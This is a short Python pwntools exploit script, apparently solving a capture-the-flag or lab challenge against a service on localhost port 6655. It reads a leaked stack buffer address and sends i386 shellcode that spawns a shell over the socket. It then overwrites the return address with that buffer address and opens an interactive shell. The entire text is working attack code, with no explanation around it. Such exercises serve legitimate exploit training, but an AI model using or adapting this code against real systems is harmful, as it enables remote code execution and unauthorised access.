#!/usr/bin/env python2

from pwn import *

def extract_hex(str):
    return int(str[str.index('0x')+2:str.index('.')],16)

context(arch = 'i386', os = 'linux')

RET_OFFSET = 0x88 + 4
SHELLCODE = asm(shellcraft.findpeersh())

r = remote("localhost", 6655)
lines = r.recvlines(2)
buffer_address=extract_hex(lines[1])

payload=flat("A" * RET_OFFSET, buffer_address)

r.send(SHELLCODE)
r.recvline()
r.send(payload)
r.interactive()

